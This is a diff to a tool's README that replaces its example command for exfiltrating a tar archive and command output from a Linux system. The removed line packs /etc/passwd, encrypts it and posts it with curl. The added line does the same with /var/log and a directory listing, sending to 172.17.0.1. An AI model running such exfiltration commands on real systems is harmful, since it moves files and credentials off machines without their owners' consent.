@@ -82,9 +82,7 @@ Variables, use `--dump_config` to see all of the options
 ### Examples
 #### Exfiltrating a Tar archive and command output from a Linux system
 ```bash
-tar -cz /etc/passwd \
-| openssl enc -a -e -aes-256-cbc -pbkdf2 -pass 'pass:EncryptMe' \
-| curl 127.0.0.1$PWD -F "dir_listing=`ls -al | openssl enc -a -e -aes-256-cbc -pbkdf2 -pass 'pass:EncryptMe'`" -F "upload=@-" 
+tar cz /var/log | base64 | xxd -ps | gzip | openssl enc -aes-256-cbc -pass 'pass:EncryptMe' -e -a -pbkdf2 | curl 172.17.0.1$PWD -F 'logs=@-' -F "listing=`ls -al * | gzip | base64`"
 ```
 
 ![example-screenshot.png](docs/example-screenshot.png)
